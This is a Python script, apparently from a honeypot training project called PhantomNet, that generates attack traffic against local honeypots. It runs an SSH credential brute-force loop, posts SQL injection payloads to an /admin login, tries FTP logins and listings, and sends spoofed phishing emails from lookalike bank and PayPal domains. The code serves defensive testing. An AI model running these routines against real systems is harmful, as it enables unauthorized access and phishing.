#!/usr/bin/env python3

"""
PhantomNet – Week 6 Day 2
Attack Scenario Generator (REAL TRAFFIC)

Covered:
✔ Step 2: SSH brute force (AsyncSSH honeypot)
✔ Step 3: HTTP SQL Injection (HTTP honeypot)
"""

import asyncio
import asyncssh
import random
import time
import requests
from ftplib import FTP
import smtplib
from email.message import EmailMessage
from datetime import datetime

# ===============================
# CONFIGURATION
# ===============================

# SSH Honeypot
SSH_HONEYPOT_HOST = "127.0.0.1"
SSH_HONEYPOT_PORT = 2222   # change ONLY if your SSH honeypot uses a different port
SSH_ATTEMPTS = 15
SSH_WINDOW_SECONDS = 30

# HTTP Honeypot
HTTP_HONEYPOT_URL = "http://127.0.0.1:8080"
HTTP_ATTEMPTS = 15

#FTP Honeypot
FTP_HONEYPOT_HOST = "127.0.0.1"
FTP_HONEYPOT_PORT = 2121   # change if your FTP honeypot uses a different port
FTP_ATTEMPTS = 10

#SMTP Honeypot
SMTP_HONEYPOT_HOST = "127.0.0.1"
SMTP_HONEYPOT_PORT = 2525
SMTP_ATTEMPTS = 10


# ===============================
# UTILITY
# ===============================

def log(msg):
    print(f"[{datetime.utcnow().isoformat()}Z] {msg}")


# ===============================
# STEP 2: SSH BRUTE FORCE
# ===============================

async def ssh_bruteforce_attack():
    log("Starting SSH brute-force attack simulation")

    usernames = ["root", "admin", "test", "ubuntu"]
    passwords = ["123456", "password", "admin", "root", "qwerty"]

    interval = SSH_WINDOW_SECONDS / SSH_ATTEMPTS

    for i in range(SSH_ATTEMPTS):
        username = random.choice(usernames)
        password = random.choice(passwords)

        try:
            await asyncssh.connect(
                SSH_HONEYPOT_HOST,
                port=SSH_HONEYPOT_PORT,
                username=username,
                password=password,
                known_hosts=None,
                login_timeout=5
            )
        except Exception:
            # Expected failure
            log(f"SSH failed login {i+1} | user={username}")

        await asyncio.sleep(interval)

    log("SSH brute-force attack completed")


# ===============================
# STEP 3: HTTP SQL INJECTION
# ===============================

def http_sqli_attack():
    log("Starting HTTP SQL injection simulation")

    payloads = [
        "' or 1=1",
        "\" or \"1\"=\"1",
        "' union select",
        "'--",
        "\"--",
        ";--"
    ]

    url = HTTP_HONEYPOT_URL + "/admin"

    headers = {
        "User-Agent": "Mozilla/5.0 (AttackSimulator)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    for i in range(HTTP_ATTEMPTS):
        payload = random.choice(payloads)

        data = {
            "username": payload,
            "password": payload
        }

        try:
            requests.post(
                url,
                data=data,
                headers=headers,
                timeout=3
            )
            log(f"HTTP SQLi attempt {i+1} | payload={payload}")
        except Exception as e:
            log(f"HTTP SQLi request failed: {e}")

        time.sleep(0.4)

    log("HTTP SQL injection simulation completed")

# ===============================
# STEP 4: FTP RECONNAISSANCE
# ===============================

def ftp_recon_attack():
    log("Starting FTP reconnaissance simulation")

    usernames = ["anonymous", "ftp", "admin", "test"]
    passwords = ["anonymous@", "test", "admin", "123456"]

    for i in range(FTP_ATTEMPTS):
        user = random.choice(usernames)
        pwd = random.choice(passwords)

        try:
            ftp = FTP()
            ftp.connect(FTP_HONEYPOT_HOST, FTP_HONEYPOT_PORT, timeout=5)
            ftp.login(user=user, passwd=pwd)

            # Recon action: directory listing
            try:
                ftp.retrlines("LIST")
            except Exception:
                pass

            ftp.quit()
            log(f"FTP recon {i+1} | user={user}")

        except Exception:
            # Expected for honeypots
            log(f"FTP login failed {i+1} | user={user}")

        time.sleep(0.5)

    log("FTP reconnaissance simulation completed")

# ===============================
# STEP 5: SMTP SPOOFING
# ===============================

def smtp_spoof_attack():
    log("Starting SMTP spoofing simulation")

    spoofed_senders = [
        "admin@bank-secure.com",
        "support@paypal-secure.net",
        "alerts@company-login.org"
    ]

    recipients = [
        "user@example.com",
        "admin@example.com"
    ]

    for i in range(SMTP_ATTEMPTS):
        msg = EmailMessage()
        msg["From"] = random.choice(spoofed_senders)
        msg["To"] = random.choice(recipients)
        msg["Subject"] = "Urgent: Verify your account"

        msg.set_content(
            "Your account has been flagged. Please verify immediately."
        )

        try:
            with smtplib.SMTP(
                SMTP_HONEYPOT_HOST,
                SMTP_HONEYPOT_PORT,
                timeout=5
            ) as server:
                server.send_message(msg)

            log(f"SMTP spoof attempt {i+1} | from={msg['From']}")

        except Exception as e:
            log(f"SMTP send failed {i+1}: {e}")

        time.sleep(0.5)

    log("SMTP spoofing simulation completed")


# ===============================
# MAIN
# ===============================

def main():
    log("PhantomNet Attack Scenario Generator Started")

    # Step 2: SSH
    asyncio.run(ssh_bruteforce_attack())

    # Step 3: HTTP
    http_sqli_attack()

    # Step 4: FTP
    ftp_recon_attack()

    # Step 5: SMTP
    smtp_spoof_attack()

    log("Attack scenarios execution finished")



if __name__ == "__main__":
    main()
